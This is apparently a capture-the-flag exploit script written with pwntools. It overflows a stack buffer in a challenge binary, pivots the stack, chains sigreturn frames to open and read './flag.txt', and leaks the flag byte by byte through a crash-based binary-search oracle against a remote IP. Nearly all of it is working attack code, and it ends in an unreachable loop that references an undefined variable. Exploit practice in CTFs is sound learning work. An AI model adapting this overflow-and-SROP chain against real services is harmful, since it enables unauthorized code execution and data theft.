from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess

context.arch = "amd64"
context.word_size = 64
context.bits = 64
context.os = "linux"

file = "./chall"
exe_args = []
io: process = None
PREFIX = b"========================\n"

speed = 0.01

def debug():
    gdb.attach(io, gdbscript=
    """
    
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote("209.126.9.222", 5000)

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug()

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
sprefix = lambda a: sla(PREFIX, a)
choice = lambda a: snum(PREFIX, a)

def launch():
    if args.REMOTE:
        l = launch_remote
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    # libc = ELF("./libc.so.6")

# chars = "{}" + (string.digits + string.ascii_lowercase)[::-1]
chars = "".join([chr(i) for i in range(0x100)])[::-1]
print(chars)
current_try = 0
# tries = 0
flag = "CSCTF{"
# CSCTF{s33r}
flag_bytes = len(flag)+1
flag_prog = log.progress("Flag")
flag_prog.status(flag)
def exploit():
    global flag_bytes, current_try
    payload = flat([
        b"A"*0x40,
        0x402000+0x40,
        0x401017,
    ])
    io.send(payload)
    sleep(speed)

    syscall = 0x40102a
    syscall_read = 0x401025
    leave_ret = 0x40102c
    ret = 0x40102d

    payload = flat([
        flat([
            0x402000+0x20+0x68+0x40+8+0x10+0x40,
            0x401017,
            0x402020,
            syscall_read,
            0x402030,
            syscall,
        ], length=0x40, filler=b"\0"),
        0x402000+0x30+0x68+0x40+8,
        0x401017,
    ])
    io.send(payload)
    sleep(speed)

    payload = flat([
        {
            0x0: 0x402000, # rsi
            0x8: 0x402000, # rbp
            0x18: 0x1000, # rdx
            0x20: 0, # rax

            0x30: 0x402100, # rsp
            0x38: syscall, # rip
        },
        0x402000,
        leave_ret,
    ], filler=b"\0")
    io.send(payload)
    sleep(speed)


    payload = flat([
        {
            0x0: 0x202,
            0x8: [
                p16(0x33),
                p16(0x33),
                p16(0x33),
                p16(0),
            ],
            0x38: 0, # rip
        },
        0x402000+0x10,
        leave_ret,
    ], filler=b"\0")
    io.send(payload)
    sleep(speed)

    io.send(p64(0x202) + p16(0x33) + p16(0x33) + p16(0x33) + b"\0")
    sleep(speed)

    open_frame = SigreturnFrame()
    open_frame.rax = 2
    open_frame.rdi = 0x402000
    open_frame.rsi = 0
    open_frame.rdx = 0
    open_frame.rbp = 0x402020 + len(bytes(open_frame))+8
    open_frame.rsp = 0x402ff8
    open_frame.rip = syscall

    post_open = 0x402020 + len(bytes(open_frame))+8


    readflag_frame = SigreturnFrame()
    readflag_frame.rax = 0
    readflag_frame.rdi = 3
    readflag_frame.rsi = 0x402d00 + 0x88 - flag_bytes + 1
    readflag_frame.rdx = flag_bytes
    readflag_frame.rbp = post_open + 0x18 + len(bytes(readflag_frame))+8
    readflag_frame.rsp = 0x402ff8
    readflag_frame.rip = syscall

    post_readflag = post_open + 0x18 + len(bytes(readflag_frame))+8

    frame1_frame = SigreturnFrame()
    frame1_frame.rax = 0
    frame1_frame.rdi = 0
    frame1_frame.rsi = 0x402d00 - 0x10
    frame1_frame.rdx = 0x10 + 0x88
    frame1_frame.rbp = post_readflag + 0x18 + len(bytes(frame1_frame))+8
    frame1_frame.rsp = 0x402ff8
    frame1_frame.rip = syscall

    post_frame1 = post_readflag + 0x18 + len(bytes(frame1_frame))+8

    frame2_frame = SigreturnFrame()
    frame2_frame.rax = 0
    frame2_frame.rdi = 0
    frame2_frame.rsi = 0x402d00 + 0x88 + 8
    frame2_frame.rdx = 0x100
    frame2_frame.rbp = post_frame1 + 0x18 + len(bytes(frame2_frame))+8
    frame2_frame.rsp = 0x402ff8
    frame2_frame.rip = syscall

    post_frame2 = post_frame1 + 0x18 + len(bytes(frame2_frame))+8

    payload = flat([
        0x402018,
        ret,
        syscall_read,
        0x402020,
        syscall,
        bytes(open_frame),

        0x402f00,
        0x401017,
        post_open+0x20,
        syscall,
        bytes(readflag_frame),

        0x402f00,
        0x401017,
        post_readflag+0x20,
        syscall,
        bytes(frame1_frame),

        0x402f00,
        0x401017,
        post_frame1+0x20,
        syscall,
        bytes(frame2_frame),

        0x402f00,
        0x401017,
        
        0x402e00,
        0x401017,

    ])
    io.send(payload)
    sleep(speed)

    io.send(b"./flag.txt\0".ljust(0xf, b"\0"))
    sleep(speed)



    payload = flat([
        b"A"*0x40,
        post_open+0x10,
        syscall_read,
    ], filler=b"\0")
    io.send(payload)
    sleep(speed)

    io.send(b"A"*0xf)
    sleep(speed)

    

    payload = flat([
        b"A"*0x40,
        post_readflag+0x10,
        syscall_read,
    ], filler=b"\0")
    io.send(payload)
    sleep(speed)

    io.send(b"A"*0xf)
    sleep(speed)

    payload = flat([
        0,
        syscall,
        {
            0x68: 0,
            0x70: 0x402000,
            0x78: post_frame2+0x10,
        }
    ], filler=b"\0")
    io.send(payload)
    sleep(speed)



    payload = flat([
        b"A"*0x40,
        post_frame1+0x10,
        syscall_read,
    ], filler=b"\0")
    io.send(payload)
    sleep(speed)

    io.send(b"A"*0xf)
    sleep(speed)

    payload = flat([
        {
            0x0: 0,
            0x10: 0x402ff8,
            0x18: syscall,
            0x20: 0x202,
            0x28: [
                p16(0x33),
                p16(0x33),
                p16(0x33),
                p16(0),
            ],
        }
    ], filler=b"\0")
    io.send(payload)
    sleep(speed)



    payload = flat([
        b"A"*0x40,
        0x402cf0,
        syscall_read,
    ], filler=b"\0")
    io.send(payload)
    sleep(speed)

    io.send(b"A"*0xf)
    sleep(speed)
    
    # io.interactive()

    io.send(b"A"*ord(chars[current_try]))

    io.recv(timeout=0.2)

    # input("end")
    # exit()

# launch()
# exploit()
# exit()

def compare(byte):
    global current_try
    current_try = byte
    flag_prog.status(flag + chars[current_try])
    launch()
    try:
        exploit()
        result = True
    except EOFError:
        result = False
        pass
    with context.local(log_level=logging.ERROR):
        io.close()
    return result

def binsearch():
    left = 0
    right = len(chars)
    while left <= right:
        mid = left + (right - left) // 2
        result = compare(mid)
        if result == False:
            left = mid + 1
        else:
            right = mid - 1
    return chars[mid + (1 if result == False else 0)]

while True:
    flag += binsearch()
    flag_prog.status(flag)
    flag_bytes += 1
exit()

while True:
    count = 0
    # tries += 1
    tries_prog.status(chars[current_try])

    launch()
    try:
        exploit()
        flag += chars[current_try]
        flag_prog.status(flag)
        current_try = 0
        flag_bytes += 1
        continue
    except EOFError:
        pass

    with context.local(log_level=logging.ERROR):
        io.close()
    
    current_try += 1
    # sleep(0.05)